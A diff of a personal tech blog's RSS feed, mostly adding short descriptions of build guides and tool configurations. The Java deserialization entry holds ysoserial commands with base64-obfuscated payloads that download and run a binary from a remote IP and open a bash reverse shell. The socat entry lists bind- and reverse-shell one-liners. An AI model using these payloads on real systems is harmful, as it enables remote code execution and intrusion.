@@ -13,308 +13,432 @@
       <link>https://xhstormr.github.io/blog/posts/openapi/</link>
       <pubDate>Thu, 04 Nov 2021 10:17:00 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/openapi/</guid>
-      <description></description>
+      <description>Updated on 2021-11-04
+https://editor.swagger.io https://petstore.swagger.io https://api.openapi-generator.tech/index.html https://swagger.io/docs/specification/basic-structure/ https://github.com/OAI/OpenAPI-Specification </description>
     </item>
     <item>
       <title>Alacritty</title>
       <link>https://xhstormr.github.io/blog/posts/alacritty/</link>
       <pubDate>Wed, 18 Aug 2021 10:13:37 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/alacritty/</guid>
-      <description></description>
+      <description>Updated on 2021-08-18
+https://github.com/alacritty/alacritty
+env: TERM: screen-256color shell: program: /usr/local/Caskroom/miniconda/base/bin/fish window: startup_mode: Maximized dynamic_title: true font: size: 14 normal: family: JetBrainsMono Nerd Font bell: animation: EaseOutSine duration: 600 color: &amp;#39;#4e4e4e&amp;#39; mouse_bindings: - { mouse: Middle, action: PasteSelection } background_opacity: 0.9 draw_bold_text_with_bright_colors: true key_bindings: - { key: A, mods: Alt, chars: &amp;#34;\x1ba&amp;#34; } - { key: B, mods: Alt, chars: &amp;#34;\x1bb&amp;#34; } - { key: C, mods: Alt, chars: &amp;#34;\x1bc&amp;#34; } - { key: D, mods: Alt, chars: &amp;#34;\x1bd&amp;#34; } - { key: E, mods: Alt, chars: &amp;#34;\x1be&amp;#34; } - { key: F, mods: Alt, chars: &amp;#34;\x1bf&amp;#34; } - { key: G, mods: Alt, chars: &amp;#34;\x1bg&amp;#34; } - { key: H, mods: Alt, chars: &amp;#34;\x1bh&amp;#34; } - { key: I, mods: Alt, chars: &amp;#34;\x1bi&amp;#34; } - { key: J, mods: Alt, chars: &amp;#34;\x1bj&amp;#34; } - { key: K, mods: Alt, chars: &amp;#34;\x1bk&amp;#34; } - { key: L, mods: Alt, chars: &amp;#34;\x1bl&amp;#34; } - { key: M, mods: Alt, chars: &amp;#34;\x1bm&amp;#34; } - { key: N, mods: Alt, chars: &amp;#34;\x1bn&amp;#34; } - { key: O, mods: Alt, chars: &amp;#34;\x1bo&amp;#34; } - { key: P, mods: Alt, chars: &amp;#34;\x1bp&amp;#34; } - { key: Q, mods: Alt, chars: &amp;#34;\x1bq&amp;#34; } - { key: R, mods: Alt, chars: &amp;#34;\x1br&amp;#34; } - { key: S, mods: Alt, chars: &amp;#34;\x1bs&amp;#34; } - { key: T, mods: Alt, chars: &amp;#34;\x1bt&amp;#34; } - { key: U, mods: Alt, chars: &amp;#34;\x1bu&amp;#34; } - { key: V, mods: Alt, chars: &amp;#34;\x1bv&amp;#34; } - { key: W, mods: Alt, chars: &amp;#34;\x1bw&amp;#34; } - { key: X, mods: Alt, chars: &amp;#34;\x1bx&amp;#34; } - { key: Y, mods: Alt, chars: &amp;#34;\x1by&amp;#34; } - { key: Z, mods: Alt, chars: &amp;#34;\x1bz&amp;#34; } # curl -o ~/.</description>
     </item>
     <item>
       <title>Mac OS</title>
       <link>https://xhstormr.github.io/blog/posts/mac-os/</link>
       <pubDate>Thu, 22 Jul 2021 22:56:57 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/mac-os/</guid>
-      <description></description>
+      <description>Updated on 2021-07-22
+Homebrew https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ https://brew.sh/ brew cleanup --prune=all -s brew update &amp;amp;&amp;amp; brew upgrade --greedy ❯ brew list -1 ==&amp;gt; Formulae aria2 coreutils gnu-sed hugo libssh2 nnn openssl@1.1 readline ==&amp;gt; Casks alfred amethyst cyberduck google-chrome iina intellij-idea karabiner-elements kitty maczip megasync miniconda mounty onyx rectangle snipaste sourcetree vlc xnviewmp Miniconda https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/ ❯ conda env export name: base channels: - conda-forge - defaults dependencies: - bat=0.18.2=h244e342_0 - brotlipy=0.7.0=py38h96a0964_1001 - bzip2=1.0.8=h0d85af4_4 - c-ares=1.</description>
     </item>
     <item>
       <title>乐理</title>
       <link>https://xhstormr.github.io/blog/posts/music-theory/</link>
       <pubDate>Sat, 05 Jun 2021 16:46:13 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/music-theory/</guid>
-      <description></description>
+      <description>Updated on 2021-06-05
+简谱	音名	唱名 1	C	do 2	D	re 3	E	mi 4	F	fa 5	G	sol 6	A	la 7	B	si 大调音阶：两全一半三全一半</description>
     </item>
     <item>
       <title>PHP with Nginx</title>
       <link>https://xhstormr.github.io/blog/posts/php-with-nginx/</link>
       <pubDate>Thu, 18 Feb 2021 16:21:44 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/php-with-nginx/</guid>
-      <description></description>
+      <description>Updated on 2021-02-18
+Nginx https://mirror.azure.cn/nginx/download/ nginx.conf location ~ \.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi.conf; } PHP https://windows.php.net/downloads/releases/latest/ php.ini [PHP] extension=php_pdo_pgsql.dll extension=php_pgsql.dll extension_dir=&amp;#34;ext&amp;#34; php-cgi -b 127.0.0.1:9000 -c php.ini </description>
     </item>
     <item>
       <title>Java 反序列化漏洞利用</title>
       <link>https://xhstormr.github.io/blog/posts/java-deserialization-vul/</link>
       <pubDate>Wed, 27 Jan 2021 16:40:13 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/java-deserialization-vul/</guid>
-      <description></description>
+      <description>Updated on 2021-01-27
+探测： java -jar ysoserial-master-SNAPSHOT.jar URLDNS &amp;#34;http://y8jhkk.dnslog.cn&amp;#34; &amp;gt; URLDNS.bin 利用： java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 &amp;#34;bash -c {echo,d2dldCAtcU8gMTdLNm9NQzUgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwOi8vNDcuOTguMTM1LjY1OjgwODAvbGpDUHh6dDsgY2htb2QgK3ggMTdLNm9NQzU7IC4vMTdLNm9NQzU=}|{base64,-d}|{bash,-i}&amp;#34; &amp;gt; CommonsBeanutils1.bin 转储为文本格式： java -jar SerializationDumper-v1.13.jar -r CommonsBeanutils1.bin &amp;gt; CommonsBeanutils1.txt 还原为二进制流： java -jar SerializationDumper-v1.13.jar -b CommonsBeanutils1.txt CommonsBeanutils1.ok.bin 计算 serialVersionUID -3490850999041592962 序列化后的值： busybox printf &amp;#34;%016x&amp;#34; -3490850999041592962 |^ busybox fold -w2 |^ busybox paste -sd&amp;#34; &amp;#34; ---- cf 8e 01 82 fe 4e f1 7e Shell 中执行命令： bash -c &amp;#39;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i}&amp;#39; Java 中执行命令： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i} Reference https://github.</description>
     </item>
     <item>
       <title>JBoss Keycloak</title>
       <link>https://xhstormr.github.io/blog/posts/keycloak/</link>
       <pubDate>Tue, 13 Oct 2020 11:18:15 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/keycloak/</guid>
-      <description></description>
+      <description>Updated on 2020-10-13
+https://hub.docker.com/r/jboss/keycloak
+https://www.keycloak.org/documentation
+https://github.com/keycloak/keycloak
+https://github.com/keycloak/keycloak-documentation
+关闭强制 SSL 连接 /opt/jboss/keycloak/bin/kcadm.sh update realms/master -s sslRequired=NONE --server http://keycloak:8080/auth --realm master --user admin --password admin Reference Script Mapper Alternative https://github.com/spring-projects/spring-authorization-server </description>
     </item>
     <item>
       <title>JDK Keytool</title>
       <link>https://xhstormr.github.io/blog/posts/java-keytool/</link>
       <pubDate>Mon, 12 Oct 2020 15:31:42 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/java-keytool/</guid>
-      <description></description>
+      <description>Updated on 2020-10-12
+生成密钥对： keytool -genkeypair -keystore release.p12 -storepass changeit -storetype pkcs12 -alias release -keyalg RSA -dname &amp;#34;cn=123&amp;#34; -ext &amp;#34;san=dns:*.example.com,ip:127.0.0.1&amp;#34; -validity 365 keytool -list -keystore release.p12 -storepass changeit -storetype pkcs12 导出证书： keytool -exportcert -keystore release.p12 -storepass changeit -alias release -file release.crt -rfc keytool -printcert -file release.crt 信任证书： keytool -importcert -cacerts -trustcacerts -storepass changeit -alias release -file release.crt -noprompt keytool -list -cacerts -storepass changeit 删除证书： keytool -delete -cacerts -trustcacerts -storepass changeit -alias release 转换密钥对格式： keytool -importkeystore ^ -srckeystore release.</description>
     </item>
     <item>
       <title>Apereo CAS</title>
       <link>https://xhstormr.github.io/blog/posts/cas/</link>
       <pubDate>Mon, 12 Oct 2020 13:35:54 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cas/</guid>
-      <description></description>
+      <description>Updated on 2020-10-12
+https://github.com/apereo/cas
+折腾了 4 天，体会就是官方文档很坑爹，并且对 Docker 容器部署也不友好，弃坑。
+Reference Configuration-Properties Configuration-Properties-Common </description>
     </item>
     <item>
       <title>构建 Redis</title>
       <link>https://xhstormr.github.io/blog/posts/msys2-build-redis/</link>
       <pubDate>Thu, 08 Oct 2020 11:45:51 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/msys2-build-redis/</guid>
-      <description></description>
+      <description>Updated on 2020-10-08
+https://github.com/redis/redis
+MSYS2
+Redis
+Step D:\Work\Download\redis-unstable&amp;gt; pacman -Syu pacman -S --noconfirm --needed gcc make make CFLAGS=&amp;#39;-s -Os -D_GNU_SOURCE&amp;#39; LDFLAGS=&amp;#39;-static&amp;#39; Tool https://github.com/laixintao/iredis https://redislabs.com/redisinsight/ https://downloads.redisinsight.redislabs.com/latest/redisinsight-win.msi </description>
     </item>
     <item>
       <title>构建 kcat</title>
       <link>https://xhstormr.github.io/blog/posts/cmake-build-kcat/</link>
       <pubDate>Sun, 20 Sep 2020 11:07:42 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cmake-build-kcat/</guid>
-      <description></description>
+      <description>Updated on 2020-09-20
+cmake
+kafkacat
+librdkafka
+Step D:\Work\Download\librdkafka-master&amp;gt; type nul &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_C_FLAGS &amp;#34;-s -Os&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_CXX_FLAGS &amp;#34;-s -Os&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS &amp;#34;-static&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.cmake echo. &amp;gt;&amp;gt; PreLoad.cmake echo set(CMAKE_GENERATOR &amp;#34;MinGW Makefiles&amp;#34; CACHE INTERNAL &amp;#34;&amp;#34; FORCE) &amp;gt;&amp;gt; PreLoad.</description>
     </item>
     <item>
       <title>Kafka</title>
       <link>https://xhstormr.github.io/blog/posts/kafka/</link>
       <pubDate>Tue, 15 Sep 2020 19:22:58 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/kafka/</guid>
-      <description></description>
+      <description>Updated on 2020-09-15
+https://kafka.apache.org/
+https://github.com/apache/kafka
+https://www.confluent.io/download
+https://hub.docker.com/r/confluentinc/cp-kafka
+Reference https://docs.confluent.io/current/connect/transforms/index.html https://docs.confluent.io/current/connect/references/restapi.html https://docs.confluent.io/current/connect/managing/connectors.html GUI: https://www.kafkatool.com/ https://github.com/provectus/kafka-ui </description>
     </item>
     <item>
       <title>Elastic Stack</title>
       <link>https://xhstormr.github.io/blog/posts/elk/</link>
       <pubDate>Sat, 08 Aug 2020 18:39:18 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/elk/</guid>
-      <description></description>
+      <description>Updated on 2020-08-08
+https://github.com/elastic/
+https://www.docker.elastic.co/
+Docker Compose docker-compose.yml version: &amp;#39;3&amp;#39; services: kibana: image: kibana:7.9.2 restart: always environment: I18N_LOCALE: zh-CN SERVER_BASEPATH: /kibana ELASTICSEARCH_USERNAME: elastic ELASTICSEARCH_PASSWORD: elastic healthcheck: test: curl -f http://127.0.0.1:5601/ || exit 1 labels: - traefik.http.services.kibana.loadbalancer.server.port=5601 - traefik.http.routers.kibana.rule=PathPrefix(`/kibana/`) - traefik.http.routers.kibana.middlewares=kibana-stripprefix - traefik.http.middlewares.kibana-stripprefix.stripprefix.prefixes=/kibana/ depends_on: - elasticsearch elasticsearch: image: elasticsearch:7.9.2 restart: always environment: ES_JAVA_OPTS: -Xms256m -Xmx256m ELASTIC_PASSWORD: elastic xpack.security.enabled: &amp;#39;true&amp;#39; discovery.type: single-node volumes: - elasticsearch_data:/usr/share/elasticsearch/data labels: - traefik.http.services.elasticsearch.loadbalancer.server.port=9200 - traefik.http.routers.elasticsearch.rule=PathPrefix(`/es/`) - traefik.http.routers.elasticsearch.middlewares=elasticsearch-stripprefix - traefik.</description>
     </item>
     <item>
       <title>Proxy DNS</title>
       <link>https://xhstormr.github.io/blog/posts/coredns/</link>
       <pubDate>Sun, 03 May 2020 10:03:50 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/coredns/</guid>
-      <description></description>
+      <description>Updated on 2020-05-03
+V2Ray https://github.com/v2fly/v2ray-core https://www.v2fly.org/guide/start.html { &amp;#34;inbound&amp;#34;: { &amp;#34;port&amp;#34;: 1080, &amp;#34;listen&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;protocol&amp;#34;: &amp;#34;socks&amp;#34; }, &amp;#34;outbound&amp;#34;: { &amp;#34;protocol&amp;#34;: &amp;#34;freedom&amp;#34;, &amp;#34;settings&amp;#34;: { &amp;#34;domainStrategy&amp;#34;: &amp;#34;UseIPv4&amp;#34; } }, &amp;#34;dns&amp;#34;: { &amp;#34;queryStrategy&amp;#34;: &amp;#34;UseIPv4&amp;#34;, &amp;#34;disableCache&amp;#34;: false, &amp;#34;servers&amp;#34;: [ &amp;#34;https://9.9.9.9/dns-query&amp;#34; ] } } Clash https://dreamacro.github.io/clash/ https://github.com/Dreamacro/clash/wiki/Configuration dns: enable: true default-nameserver: - 8.8.8.8 nameserver: - https://9.9.9.9/dns-query curl &amp;#39;https://www.google.com&amp;#39; -Ivx socks5h://127.0.0.1:1080 CoreDNS https://github.com/coredns/coredns https://coredns.io/plugins/ Corefile . { forward . tls://223.5.5.5 tls://223.6.6.6 { tls_servername dns.alidns.com } log errors cache } nslookup google.</description>
     </item>
     <item>
       <title>Cuckoo</title>
       <link>https://xhstormr.github.io/blog/posts/cuckoo/</link>
       <pubDate>Mon, 27 Apr 2020 22:18:01 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cuckoo/</guid>
-      <description></description>
+      <description>Updated on 2020-04-27
+https://github.com/cuckoosandbox/cuckoo
+https://cuckoo.sh/docs/installation/index.html
+Basic conda config --add channels conda-forge conda create -y -n myenv2 pycrypto m2crypto python=2 conda activate myenv2 python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade cuckoo M2CryptoWin64 cuckoo init cuckoo community cuckoo cuckoo submit --package exe --options arguments=&amp;#34;-Lvk http://www.qq.com&amp;#34; curl.exe Web cuckoo web runserver 0.0.0.0:1234 MongoDB mongod --dbpath D:\Work\mongo\db --bind_ip_all mongo ---- use admin db.createUser({user: &amp;#34;root&amp;#34;, pwd: &amp;#34;123456&amp;#34;, roles: [{db: &amp;#34;admin&amp;#34;, role: &amp;#34;root&amp;#34;}]}) use cuckoo db.createUser({user: &amp;#34;123&amp;#34;, pwd: &amp;#34;123456&amp;#34;, roles: [{db: &amp;#34;cuckoo&amp;#34;, role: &amp;#34;dbOwner&amp;#34;}]}) db.</description>
     </item>
     <item>
       <title>Fish Shell</title>
       <link>https://xhstormr.github.io/blog/posts/fish-shell/</link>
       <pubDate>Sun, 15 Mar 2020 17:16:19 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/fish-shell/</guid>
-      <description></description>
+      <description>Updated on 2020-03-15
+https://github.com/fish-shell/fish-shell
+https://fishshell.com/docs/current/commands.html
+https://fishshell.com/docs/current/language.html
+https://software.opensuse.org/package/fish
+Build yum -y install gcc make cmake ncurses-devel curl -LO https://github.com/fish-shell/fish-shell/archive/master.zip unzip master.zip &amp;amp;&amp;amp; cd fish-shell-master mkdir build; cd build cmake .. make install config.fish export TERM=&amp;#39;screen-256color&amp;#39; export LANG=&amp;#39;zh_CN.UTF-8&amp;#39; export VISUAL=&amp;#39;idea -e&amp;#39; export HISTCONTROL=&amp;#39;ignoredups&amp;#39; set -g fish_prompt_pwd_dir_length 0 # https://patorjk.com/software/taag/#p=display&amp;amp;f=ANSI%20Shadow&amp;amp;t=leo set -g fish_greeting &amp;#39; ██╗ ███████╗ ██████╗ ██║ ██╔════╝██╔═══██╗ ██║ █████╗ ██║ ██║ ██║ ██╔══╝ ██║ ██║ ███████╗███████╗╚██████╔╝ ╚══════╝╚══════╝ ╚═════╝ _____ / \ vvvvvvv/|____/| I /O,O | I /_____ | /|/| J|/^ ^ ^ \ | /00 | _//| |^ ^ ^ ^ |W| |/^^\ | /oo | \m___m__|_| \m_m_| \mm_| &amp;#39; alias rm=&amp;#39;rm -i&amp;#39; alias cp=&amp;#39;cp -i&amp;#39; alias mv=&amp;#39;mv -i&amp;#39; alias df=&amp;#39;df -h&amp;#39; alias du=&amp;#39;du -h&amp;#39; alias less=&amp;#39;less -r&amp;#39; alias whence=&amp;#39;type -a&amp;#39; alias grep=&amp;#39;grep -n --color=auto&amp;#39; alias egrep=&amp;#39;egrep --color=auto&amp;#39; alias fgrep=&amp;#39;fgrep --color=auto&amp;#39; alias pgrep=&amp;#39;pgrep -a&amp;#39; # curl -o /usr/local/bin/fzf-tmux https://raw.</description>
     </item>
     <item>
       <title>构建 Lua</title>
       <link>https://xhstormr.github.io/blog/posts/msys2-build-lua/</link>
       <pubDate>Sun, 15 Mar 2020 00:14:57 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/msys2-build-lua/</guid>
-      <description></description>
+      <description>Updated on 2020-03-15
+https://www.lua.org/download.html
+Step pacman -Syu pacman -S --noconfirm --needed gcc make curl -O https://www.lua.org/ftp/lua-5.4.0.tar.gz tar zxf lua-5.4.0.tar.gz cd lua-5.4.0 make posix install CC=&amp;#39;x86_64-pc-msys-gcc&amp;#39; </description>
     </item>
     <item>
       <title>Android Proxy</title>
       <link>https://xhstormr.github.io/blog/posts/android-proxy/</link>
       <pubDate>Fri, 28 Feb 2020 14:06:07 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/android-proxy/</guid>
-      <description></description>
+      <description>Updated on 2020-02-28
+Tun2socks https://github.com/eycorsican/go-tun2socks Reference https://github.com/ambrop72/badvpn/wiki/Tun2socks Postern https://github.com/postern-overwal/postern-stuff [Proxy] Proxy = https,192.168.1.4,8080 [Rule] FINAL,Proxy Shadowsocks https://github.com/shadowsocks/shadowsocks-android ss://YWVzLTI1Ni1nY206MTIzNDU2@192.168.1.4:1234 V2ray Config { &amp;#34;log&amp;#34;: { &amp;#34;loglevel&amp;#34;: &amp;#34;warning&amp;#34; }, &amp;#34;inbound&amp;#34;: { &amp;#34;port&amp;#34;: 1234, &amp;#34;listen&amp;#34;: &amp;#34;192.168.1.4&amp;#34;, &amp;#34;protocol&amp;#34;: &amp;#34;shadowsocks&amp;#34;, &amp;#34;settings&amp;#34;: { &amp;#34;method&amp;#34;: &amp;#34;aes-256-gcm&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;123456&amp;#34; } }, &amp;#34;outbound&amp;#34;: { &amp;#34;protocol&amp;#34;: &amp;#34;http&amp;#34;, &amp;#34;settings&amp;#34;: { &amp;#34;servers&amp;#34;: [ { &amp;#34;address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;port&amp;#34;: 8080 } ] } }, &amp;#34;outboundDetour&amp;#34;: [ { &amp;#34;tag&amp;#34;: &amp;#34;dns&amp;#34;, &amp;#34;protocol&amp;#34;: &amp;#34;freedom&amp;#34; } ], &amp;#34;routing&amp;#34;: { &amp;#34;settings&amp;#34;: { &amp;#34;rules&amp;#34;: [ { &amp;#34;outboundTag&amp;#34;: &amp;#34;dns&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;field&amp;#34;, &amp;#34;port&amp;#34;: &amp;#34;53&amp;#34; } ] } } } Clash https://github.</description>
     </item>
     <item>
       <title>构建 HAProxy</title>
       <link>https://xhstormr.github.io/blog/posts/msys2-build-haproxy/</link>
       <pubDate>Fri, 21 Feb 2020 23:20:13 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/msys2-build-haproxy/</guid>
-      <description></description>
+      <description>Updated on 2020-02-21
+https://github.com/haproxy/haproxy
+MSYS2
+HAProxy
+Step D:\Work\Download\haproxy-2.1.3&amp;gt; pacman -Syu pacman -S --noconfirm --needed gcc make make TARGET=cygwin USE_THREAD=1 CFLAGS=&amp;#39;-s -Os&amp;#39; LDFLAGS=&amp;#39;-static&amp;#39; strip -sv haproxy.exe 端口复用 global daemon defaults timeout connect 5000ms timeout client 50000ms timeout server 50000ms frontend main bind *:1025 use_backend ssh if { req.payload(0,3) -m bin 535348 } use_backend socks if { req.payload(0,3) -m bin 050100 050200 050300 } default_backend http backend http server default 127.0.0.1:80 backend ssh server default 127.</description>
     </item>
     <item>
       <title>交叉编译 masscan</title>
       <link>https://xhstormr.github.io/blog/posts/cross-compile-masscan/</link>
       <pubDate>Mon, 17 Feb 2020 16:45:32 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cross-compile-masscan/</guid>
-      <description></description>
+      <description>Updated on 2020-02-17
+masscan
+Step docker pull ubuntu:rolling docker run -it --rm -v `pwd`:`pwd` -w `pwd` ubuntu:rolling sed -i &amp;#39;s/archive.ubuntu.com/mirrors.aliyun.com/g;s/security.ubuntu.com/mirrors.aliyun.com/g&amp;#39; /etc/apt/sources.list apt update &amp;amp;&amp;amp; apt -y install gcc-mingw-w64 make curl unzip curl -LO https://github.com/robertdavidgraham/masscan/archive/master.zip unzip master.zip &amp;amp;&amp;amp; cd masscan-master find -type f -exec sed -i &amp;#39;s/WinSock.h/winsock.h/g;s/WinSock2.h/winsock2.h/g;s/Windows.h/windows.h/g&amp;#39; {} + sed -i &amp;#39;s/-march=i686//g;s/CC = cc/CC = x86_64-w64-mingw32-gcc/g;s/lIPHLPAPI/liphlpapi/g;s/lWs2_32/lws2_32/g&amp;#39; Makefile make </description>
     </item>
     <item>
       <title>交叉编译 jq</title>
       <link>https://xhstormr.github.io/blog/posts/cross-compile-jq/</link>
       <pubDate>Fri, 31 Jan 2020 20:14:56 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/cross-compile-jq/</guid>
-      <description></description>
+      <description>Updated on 2020-01-31
+jq
+Step docker pull ubuntu:rolling docker run -it --rm -v `pwd`:`pwd` -w `pwd` ubuntu:rolling sed -i &amp;#39;s/archive.ubuntu.com/mirrors.aliyun.com/g;s/security.ubuntu.com/mirrors.aliyun.com/g&amp;#39; /etc/apt/sources.list apt update &amp;amp;&amp;amp; apt -y install gcc-mingw-w64 make libtool flex bison git git clone --depth 1 --recurse-submodules -j2 https://github.com/stedolan/jq.git cd jq ; mkdir build ; cd build autoreconf -fi .. ../configure --with-oniguruma=builtin --disable-shared --enable-static --enable-all-static CFLAGS=&amp;#39;-s -Os&amp;#39; LDFLAGS=&amp;#39;-static&amp;#39; --host=&amp;#39;x86_64-w64-mingw32&amp;#39; &amp;amp;&amp;amp; make yum -y install mingw64-gcc or apt -y install gcc-mingw-w64 x86_64-w64-mingw32-gcc -s -Os -static 123.</description>
     </item>
     <item>
       <title>构建 socat</title>
       <link>https://xhstormr.github.io/blog/posts/msys2-build-socat/</link>
       <pubDate>Tue, 28 Jan 2020 21:49:39 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/msys2-build-socat/</guid>
-      <description></description>
+      <description>Updated on 2020-01-28
+MSYS2
+socat
+Step D:\Work\Download\socat&amp;gt; pacman -Syu pacman -S --noconfirm --needed gcc make libreadline-devel ./configure CFLAGS=&amp;#39;-s -static -Os&amp;#39; &amp;amp;&amp;amp; make 单向模式: -u in -&amp;gt; out -U out &amp;lt;- in Bind Shell ---- LHOST: ncat 127.0.0.1 1234 or socat tcp-connect:127.0.0.1:1234 readline RHOST: socat tcp-listen:1234,fork,reuseaddr exec:&amp;#34;cmd&amp;#34;,pty,stderr Reverse Shell ---- LHOST: socat tcp-listen:1234,fork,reuseaddr readline RHOST: socat tcp-connect:127.0.0.1:1234 exec:&amp;#34;cmd&amp;#34;,pty,stderr 单进程应用 -&amp;gt; 多进程服务 ---- LHOST: socat -u tcp-connect:127.0.0.1:1234 - RHOST: socat -U tcp-listen:1234,fork,reuseaddr exec:&amp;#34;busybox ps&amp;#34;,pty,stderr 监听端口 ---- LHOST: socat tcp-listen:1234,fork,reuseaddr - RHOST: ncat 127.</description>
     </item>
     <item>
       <title>X11 Server</title>
       <link>https://xhstormr.github.io/blog/posts/x11-server/</link>
       <pubDate>Fri, 24 Jan 2020 11:05:41 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/x11-server/</guid>
-      <description></description>
+      <description>Updated on 2020-01-24
+https://www.x.org/releases/individual/
+https://www.x.org/wiki/ModuleDescriptions/
+https://man.openbsd.org/sshd_config
+yum -y install xorg-x11-apps xorg-x11-xauth xorg-x11-server-Xorg echo X11Forwarding yes &amp;gt;&amp;gt; /etc/ssh/sshd_config echo AddressFamily inet &amp;gt;&amp;gt; /etc/ssh/sshd_config systemctl restart sshd echo $DISPLAY xeyes xmessage -file .bashrc Docker X11 Forward docker run -it --rm -v $HOME/.Xauthority:$HOME/.Xauthority:ro -e DISPLAY --net=host parrotsec/security Reference https://bugzilla.redhat.com/show_bug.cgi?id=1027197 https://stackoverflow.com/questions/16296753/can-you-run-gui-applications-in-a-docker-container </description>
     </item>
     <item>
       <title>Miniconda</title>
       <link>https://xhstormr.github.io/blog/posts/miniconda/</link>
       <pubDate>Wed, 23 Oct 2019 22:54:54 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/miniconda/</guid>
-      <description></description>
+      <description>Updated on 2019-10-23
+Python 发行版
+https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/
+https://anaconda.org/search
+https://docs.python.org/zh-cn/3/
+https://pythonguidecn.readthedocs.io/zh/latest/
+conda info conda list conda init fish conda update --all conda clean --all conda create -y -n myenv3 pycurl pycrypto ripgrep python=3 conda activate myenv3 conda deactivate conda search pycrypto conda install pycrypto conda update pycrypto conda remove pycrypto conda env list conda env export -n myenv3 -f myenv3.yml conda env remove -n myenv3 .condarc channels: - conda-forge - defaults channel_priority: strict show_channel_urls: true default_channels: - https://mirrors.</description>
     </item>
     <item>
       <title>Parrot</title>
       <link>https://xhstormr.github.io/blog/posts/parrot/</link>
       <pubDate>Sun, 18 Aug 2019 19:31:07 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/parrot/</guid>
-      <description></description>
+      <description>Updated on 2019-08-18
+https://parrotlinux.org
+systemctl restart ssh systemctl enable ssh echo deb https://mirrors.tuna.tsinghua.edu.cn/parrot/ rolling main contrib non-free &amp;gt; /etc/apt/sources.list.d/parrot.list Mirror https://docs.parrotlinux.org/mirror-list/ https://mirrors.tuna.tsinghua.edu.cn/parrot/iso/4.7/Parrot-security-4.7_x64.iso </description>
     </item>
     <item>
       <title>构建 OpenSSL</title>
       <link>https://xhstormr.github.io/blog/posts/docker-build-openssl/</link>
       <pubDate>Fri, 10 May 2019 09:19:26 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/docker-build-openssl/</guid>
-      <description></description>
+      <description>Updated on 2019-05-10
+OpenSSL
+Step docker pull gcc:latest curl https://mirrors.cloud.tencent.com/openssl/source/openssl-1.1.1e.tar.gz | tar -xz &amp;amp;&amp;amp; cd openssl-1.1.1b docker run --rm -v `pwd`:`pwd` -w `pwd` gcc:latest sh -c &amp;#39;mkdir build &amp;amp;&amp;amp; cd build &amp;amp;&amp;amp; ../config no-deprecated no-shared no-tests -static --prefix=`pwd`/123 &amp;amp;&amp;amp; make install_sw&amp;#39; </description>
     </item>
     <item>
       <title>Git &#43; CI</title>
       <link>https://xhstormr.github.io/blog/posts/git-ci/</link>
       <pubDate>Thu, 04 Apr 2019 15:32:27 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/git-ci/</guid>
-      <description></description>
+      <description>Updated on 2019-04-04
